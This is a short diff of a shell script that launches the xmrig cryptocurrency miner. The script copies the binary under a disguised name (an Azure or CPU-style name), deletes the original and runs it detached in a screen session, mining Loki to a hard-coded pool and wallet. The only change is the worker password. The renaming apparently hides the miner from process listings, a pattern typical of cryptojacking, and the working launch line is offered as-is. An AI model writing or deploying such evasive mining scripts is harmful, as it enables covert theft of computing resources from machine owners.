@@ -13,4 +13,4 @@ mv xmrig $azure -n
 sudo cp $azure "$cpuname"
 sudo rm -f  xmrig
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10113 -u LZY6QfG3gYGWHiieqPfnZtAffUV3UR7ikemzgrPwV2G88tneNqmYYGbN6ebZF56DRPavF5YnvDDJSPazqbceABDw8Bh8kCy -p forextrading -a rx/loki -k
+screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10113 -u LZY6QfG3gYGWHiieqPfnZtAffUV3UR7ikemzgrPwV2G88tneNqmYYGbN6ebZF56DRPavF5YnvDDJSPazqbceABDw8Bh8kCy -p locationx -a rx/loki -k
